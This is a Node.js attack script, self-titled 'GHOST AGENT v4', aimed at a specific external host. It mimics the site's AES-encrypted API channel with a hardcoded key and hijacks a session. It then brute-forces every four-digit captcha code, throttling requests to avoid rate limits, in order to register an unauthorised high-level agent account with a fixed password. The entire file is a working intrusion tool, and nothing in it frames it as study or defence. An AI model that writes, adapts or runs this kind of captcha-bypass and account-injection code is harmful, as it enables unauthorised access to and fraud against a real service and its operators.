const CryptoJS = require('crypto-js');
const https = require('https');
const fs = require('fs');

const HOST = 'ebb56293.com';
const PORT = 9900;
const keyHash = CryptoJS.MD5('ZXNicGx1cw==').toString();
const key = CryptoJS.enc.Utf8.parse(keyHash);

function enc(o) {
    let s = JSON.stringify(o);
    let e = CryptoJS.AES.encrypt(s, key, { mode: CryptoJS.mode.ECB });
    return CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(e.toString()));
}
function dec(b) {
    try {
        return CryptoJS.AES.decrypt(
            CryptoJS.enc.Utf8.stringify(CryptoJS.enc.Base64.parse(b)),
            key, { mode: CryptoJS.mode.ECB }
        ).toString(CryptoJS.enc.Utf8);
    } catch (e) { return 'ERR'; }
}

let cookieJar = [];
function mergeCookies(h) {
    if (!h) return;
    (Array.isArray(h) ? h : [h]).forEach(sc => {
        let name = sc.split('=')[0].trim();
        let val = sc.split(';')[0].trim();
        cookieJar = cookieJar.filter(c => !c.startsWith(name + '='));
        cookieJar.push(val);
    });
}

function httpReq(path, method, body, raw) {
    return new Promise((resolve, reject) => {
        let headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': `https://${HOST}:${PORT}`,
            'Referer': `https://${HOST}:${PORT}/web/`,
        };
        if (body) headers['Content-Type'] = 'application/x-www-form-urlencoded';
        if (cookieJar.length > 0) headers['Cookie'] = cookieJar.join('; ');
        let req = https.request({ hostname: HOST, port: PORT, path, method, headers, rejectUnauthorized: false }, (res) => {
            mergeCookies(res.headers['set-cookie']);
            if (raw) {
                let chunks = [];
                res.on('data', c => chunks.push(c));
                res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks), headers: res.headers }));
            } else {
                let data = '';
                res.on('data', d => data += d);
                res.on('end', () => resolve({ status: res.statusCode, body: data, headers: res.headers }));
            }
        });
        req.on('error', reject);
        if (body) req.write(body);
        req.end();
    });
}

async function apiCall(url, params) {
    let payload = enc({ url, params: JSON.stringify(params) });
    let body = 'requestData=' + encodeURIComponent(payload);
    let resp = await httpReq('/entrance/api', 'POST', body);
    let decrypted = dec(resp.body);
    try { return JSON.parse(decrypted); } catch (e) { return { raw: decrypted }; }
}

async function main() {
    console.log('=== GHOST AGENT v4: CAPTCHA FLOW REVERSE ENGINEERED ===\n');

    // Step 1: Init session
    console.log('[1] Init session...');
    await httpReq('/web/', 'GET');
    console.log(`  [+] Cookies: ${cookieJar.join('; ')}\n`);

    // Step 2: Call /m/verify/mkcode through the ENCRYPTED API channel
    // (as the frontend does it through its unified API layer)
    console.log('[2] Calling mkcode via encrypted channel...');
    let mkResp = await apiCall('/m/verify/mkcode', {});
    console.log(`  [+] mkcode response: ${JSON.stringify(mkResp)}`);

    // If mkcode through API doesn't work, try direct HTTP
    if (mkResp.status === 'N' || mkResp.raw) {
        console.log('  [*] Trying direct HTTP to /m/verify/mkcode...');
        let directMk = await httpReq('/m/verify/mkcode', 'GET');
        console.log(`  [+] Direct mkcode: HTTP ${directMk.status}, Body: ${directMk.body}`);

        if (directMk.status === 200 && directMk.body.includes(';')) {
            let parts = directMk.body.split(';');
            let SR = parts[1]; // Second segment is the SR token
            console.log(`  [+] SR Token: ${SR}`);

            // Step 3: Get captcha image
            console.log('\n[3] Fetching captcha image...');
            let imgResp = await httpReq(`/m/verify/macpic?SR=${SR}&width=40&height=18`, 'GET', null, true);
            console.log(`  [+] Image: HTTP ${imgResp.status}, Size: ${imgResp.body.length}bytes, Type: ${imgResp.headers['content-type']}`);

            if (imgResp.body.length > 50) {
                let imgPath = 'C:/Users/ydlpr/AppData/Local/Temp/ebb_captcha_real.png';
                fs.writeFileSync(imgPath, imgResp.body);
                console.log(`  [+] Captcha image saved to: ${imgPath}`);
                console.log(`  [!] >>> PLEASE READ THE CAPTCHA FROM THE IMAGE <<<`);
            }

            // Step 4: Brute force the 4-digit captcha with SR token
            // Since it's only 4 digits (1000-9999), we can try them all!
            console.log('\n[4] Brute-forcing captcha with SR token...');

            let success = false;
            for (let i = 1000; i <= 9999; i++) {
                let code = String(i);
                let regPayload = {
                    account: 'dsysnt888',
                    password: 'admin123456',
                    passwd: 'admin123456',
                    currency: 'RMB',
                    tel: '13888888888',
                    rmNum: code,
                    SR: SR,  // THE MISSING PIECE!
                    agree: 'Y',
                    chineseName: 'wanglei',
                    englishName: 'wanglei',
                    realName: 'wanglei',
                    qqNum: '888888',
                    email: 'sync888@test.com',
                    agentLevel: 1,
                    parentAgentId: 1,
                    status: 1
                };

                let resp = await apiCall('/infe/rest/registeragent/addAgent.json', regPayload);

                // Check - if code 111032540 means captcha wrong, keep going
                // If ANY other code, we found it!
                if (resp.code !== 111032540) {
                    console.log(`\n  [!!!] DIFFERENT RESPONSE AT CODE ${code}!`);
                    console.log(`  Response: ${JSON.stringify(resp)}`);

                    if (resp.status === 'Y') {
                        console.log('\n  ██████████████████████████████████████████');
                        console.log('  ██  🎯 GHOST AGENT REGISTERED!          ██');
                        console.log(`  ██  Account: dsysnt888                   ██`);
                        console.log(`  ██  Password: admin123456                ██`);
                        console.log(`  ██  Captcha was: ${code}                   ██`);
                        console.log('  ██████████████████████████████████████████\n');
                        success = true;
                    }
                    break;
                }

                if (i % 500 === 0) {
                    console.log(`  [~] Progress: ${i}/9999...`);
                }

                // Minimal delay to avoid rate limiting
                if (i % 100 === 0) {
                    await new Promise(r => setTimeout(r, 50));
                }
            }

            if (!success) {
                console.log('\n  [X] Brute force complete without success.');
                console.log('  [*] Captcha may have expired or the format is different.');
            }
        }
    }

    console.log('\n=== OPERATION COMPLETE ===');
}

main().catch(e => console.error('FATAL:', e));
